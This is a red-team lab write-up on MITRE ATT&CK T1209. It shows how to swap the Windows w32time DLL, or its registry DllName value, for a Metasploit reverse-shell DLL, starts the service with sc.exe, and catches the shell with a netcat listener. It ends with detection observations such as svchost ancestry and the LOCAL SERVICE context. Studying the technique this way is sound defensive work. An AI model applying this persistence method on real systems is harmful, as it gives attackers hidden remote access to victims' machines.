---
description: Persistence
---

# T1209: Hijacking Time Providers

## Execution

Service w32time depends on the DLL specified in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`. 

If the attacker can replace the `w32time.dll` with his malicious DLL or modify the DllName value to point to his malicious binary, he can get the code execution. We will just swap out the w32time.dll with our own that contains a metasploit reverse shell payload:

![](../.gitbook/assets/time-registry.png)

Starting the w32time service:

```bash
C:\Users\mantvydas\Start Menu\Programs\Startup>sc.exe start w32time

SERVICE_NAME: w32time
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 964
        FLAGS              :
```

## Observations

Incoming reverse shell from the victim system:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```bash
root@~# nc -lvvp 443
listening on [any] 443 ...
10.0.0.2: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 64634
```
{% endcode-tabs-item %}
{% endcode-tabs %}

The shell is running as a child of svchost which is expected as this is where all the services originate from:

![](../.gitbook/assets/time-ancestry.png)

Note that the code is running under the context of `LOCAL SERVICE`:

![](../.gitbook/assets/time-context.png)

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1209\",\"type\":\"link\",\"title\":\"Time Providers - ATT&CK for Enterprise\"}" %}

